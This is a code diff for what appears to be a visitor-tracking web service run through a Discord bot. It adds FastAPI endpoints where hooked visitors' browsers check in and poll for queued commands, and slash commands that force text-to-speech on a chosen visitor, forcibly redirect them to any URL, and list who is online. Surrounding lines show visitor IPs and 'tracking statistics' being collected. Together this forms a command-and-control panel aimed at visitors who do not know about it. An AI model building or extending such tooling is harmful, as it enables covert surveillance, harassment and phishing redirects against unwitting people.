@@ -480,6 +480,56 @@ def create_summary_embed(user_id: str, data: dict, ip: str):
     return embed
 
 # ==================== FASTAPI ENDPOINTS ====================
+
+# Add to your FastAPI app
+
+from collections import defaultdict
+import time
+
+# Store pending commands and active users
+pending_commands = defaultdict(list)  # user_id -> list of commands
+active_users_heartbeat = {}  # user_id -> last heartbeat
+
+@app.post("/api/user/{user_id}/heartbeat")
+async def user_heartbeat(user_id: str):
+    """Receive heartbeat from user"""
+    active_users_heartbeat[user_id] = time.time()
+    return {"status": "ok", "user_id": user_id}
+
+@app.get("/api/user/{user_id}/commands")
+async def get_user_commands(user_id: str):
+    """Get pending commands for user"""
+    commands = pending_commands.get(user_id, [])
+    # Clear commands after retrieving
+    pending_commands[user_id] = []
+    
+    # Filter commands older than 30 seconds
+    current_time = time.time()
+    commands = [cmd for cmd in commands if current_time - cmd.get('timestamp', 0) < 30]
+    
+    return commands
+
+@app.get("/api/active_users")
+async def get_active_users():
+    """Get list of active users"""
+    current_time = time.time()
+    active = []
+    
+    for user_id, last_heartbeat in active_users_heartbeat.items():
+        if current_time - last_heartbeat < 60:  # Active in last minute
+            active.append({
+                'id': user_id,
+                'active_minutes': int((current_time - last_heartbeat) / 60)
+            })
+    
+    return {"users": active}
+
+@app.get("/api/user/{user_id}/exists")
+async def user_exists_endpoint(user_id: str):
+    """Check if user is active"""
+    current_time = time.time()
+    exists = user_id in active_users_heartbeat and (current_time - active_users_heartbeat[user_id] < 60)
+    return {"exists": exists}
 # Add these new endpoints to your FastAPI app
 
 class TTSCommand(BaseModel):
@@ -686,6 +736,118 @@ async def submit_visitor(request: Request, visitor: VisitorInfo):
         return JSONResponse({"error": str(e)}, status_code=500)
 
 # ==================== SLASH COMMANDS ====================
+# Add these new slash commands to your Discord bot
+
+# Store pending commands per user
+pending_commands = defaultdict(list)
+
+@bot.tree.command(name="tts", description="Send a TTS message to a specific user")
+@app_commands.describe(user_id="User ID to target", message="Message to speak")
+async def tts_command(interaction: discord.Interaction, user_id: str, message: str):
+    """Send TTS message to user"""
+    await interaction.response.defer()
+    
+    # Check if user exists
+    async with aiohttp.ClientSession() as session:
+        async with session.get(f"http://localhost:{PORT}/api/user/{user_id}/exists") as resp:
+            if resp.status == 200:
+                data = await resp.json()
+                if data.get('exists'):
+                    # Queue TTS command
+                    pending_commands[user_id].append({
+                        'type': 'tts',
+                        'message': message,
+                        'timestamp': time.time()
+                    })
+                    
+                    embed = Embed(
+                        title="🔊 TTS COMMAND SENT",
+                        description=f"**Target:** `{user_id[:8]}`\n**Message:** {message}",
+                        color=Color.green(),
+                        timestamp=datetime.now()
+                    )
+                    await interaction.followup.send(embed=embed)
+                    return
+    
+    embed = Embed(
+        title="❌ TTS FAILED",
+        description=f"User `{user_id[:8]}` not found or offline",
+        color=Color.red()
+    )
+    await interaction.followup.send(embed=embed)
+
+@bot.tree.command(name="redirect", description="Redirect a user to any website")
+@app_commands.describe(user_id="User ID to target", url="Full URL to redirect to")
+async def redirect_command(interaction: discord.Interaction, user_id: str, url: str):
+    """Force redirect user to specified URL"""
+    await interaction.response.defer()
+    
+    # Validate URL
+    if not url.startswith(('http://', 'https://')):
+        url = 'https://' + url
+    
+    async with aiohttp.ClientSession() as session:
+        async with session.get(f"http://localhost:{PORT}/api/user/{user_id}/exists") as resp:
+            if resp.status == 200:
+                data = await resp.json()
+                if data.get('exists'):
+                    # Queue redirect command
+                    pending_commands[user_id].append({
+                        'type': 'redirect',
+                        'url': url,
+                        'timestamp': time.time()
+                    })
+                    
+                    embed = Embed(
+                        title="🔄 REDIRECT COMMAND SENT",
+                        description=f"**Target:** `{user_id[:8]}`\n**Destination:** {url}",
+                        color=Color.orange(),
+                        timestamp=datetime.now()
+                    )
+                    embed.add_field(name="⚠️ Warning", value="User will be forcibly redirected", inline=False)
+                    await interaction.followup.send(embed=embed)
+                    return
+    
+    embed = Embed(
+        title="❌ REDIRECT FAILED",
+        description=f"User `{user_id[:8]}` not found or offline",
+        color=Color.red()
+    )
+    await interaction.followup.send(embed=embed)
+
+@bot.tree.command(name="active", description="List active users")
+async def active_users_command(interaction: discord.Interaction):
+    """Show currently active users"""
+    await interaction.response.defer()
+    
+    async with aiohttp.ClientSession() as session:
+        async with session.get(f"http://localhost:{PORT}/api/active_users") as resp:
+            if resp.status == 200:
+                data = await resp.json()
+                users = data.get('users', [])
+                
+                if users:
+                    embed = Embed(
+                        title="👥 ACTIVE USERS",
+                        description=f"**{len(users)}** user(s) currently online",
+                        color=Color.blue(),
+                        timestamp=datetime.now()
+                    )
+                    
+                    for user in users[:10]:  # Limit to 10
+                        embed.add_field(
+                            name=f"User {user['id'][:8]}",
+                            value=f"Active for {user.get('active_minutes', 0)} min",
+                            inline=True
+                        )
+                    
+                    await interaction.followup.send(embed=embed)
+                else:
+                    await interaction.followup.send("No active users found")
+                return
+    
+    await interaction.followup.send("Error fetching active users")
+
 @bot.tree.command(name="stats", description="Get tracking statistics")
 async def stats(interaction: discord.Interaction):
     await interaction.response.defer()
